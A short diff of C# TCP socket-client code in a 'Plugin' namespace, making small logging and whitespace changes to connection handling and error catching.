@@ -46,8 +46,10 @@ namespace Plugin
                     ReceiveBufferSize = 50 * 1024,
                     SendBufferSize = 50 * 1024,
                 };
-                Debug.WriteLine(Plugin.Socket.RemoteEndPoint.ToString());
+                //Debug.WriteLine(Plugin.Socket.RemoteEndPoint.ToString());
+
                 IPEndPoint remoteEndPoint = (IPEndPoint)Plugin.Socket.RemoteEndPoint;
+
                 if (IPAddress.TryParse(remoteEndPoint.Address.ToString(), out IPAddress i4or6))
                 {
                     switch (i4or6.AddressFamily)
@@ -67,13 +69,7 @@ namespace Plugin
                             }
                             break;
                     }
-
-
                 }
-                
-                
-                
-                
                 if (TcpClient.Connected)
                 {
                     //Debug.WriteLine("Plugin Connected!");
@@ -121,7 +117,7 @@ namespace Plugin
             }
             catch (Exception ex)
             {
-                Debug.WriteLine("Disconnected! error1"+ex.ToString());
+                Debug.WriteLine("Disconnected! error1"+ex.ToString()+ ex.StackTrace);
                 IsConnected = false;
                 IsConnectedV6 = false;
                 return;
@@ -149,7 +145,10 @@ namespace Plugin
                 TcpClientV6?.Dispose();
                 GC.Collect();
             }
-            catch { }
+            catch (Exception ex)
+            {
+                Debug.WriteLine(ex.Message);
+            }
         }
 
         public static void ReadServertData(IAsyncResult ar) //Socket read/recevie
@@ -262,7 +261,7 @@ namespace Plugin
                             
                         }
                     }
-                next1:
+                    next1:
                     byte[] buffersize = BitConverter.GetBytes(msg.Length);
                     if (IsConnected)
                     {
